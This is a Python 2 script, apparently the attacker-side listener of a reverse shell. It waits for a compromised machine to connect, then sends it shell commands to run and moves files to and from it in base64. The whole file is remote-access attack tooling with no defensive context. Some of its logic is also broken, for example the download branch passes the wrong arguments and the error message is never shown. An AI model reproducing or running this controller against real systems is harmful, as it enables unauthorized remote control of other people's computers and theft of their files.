#!/usr/bin/env python

import socket, json
from get_args import *
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for icoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            
    def execute_remotely(self, command):
        if command [0] == "exit":
            self.connection.close()
            exit()

        self.connection.send (command)
        return self.connection.recv(1024)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                
                if command[0] == "download" and not "[-] Error " not in result:
                    result = self.write_file(result)
            except Exception:
                command_result = "[-] Error during comand execution."

            print(result)


args = get_arguments()

ip_adress = args.ip
port = args.port

my_listener = Listener(ip_adress, int(port))
my_listener.run()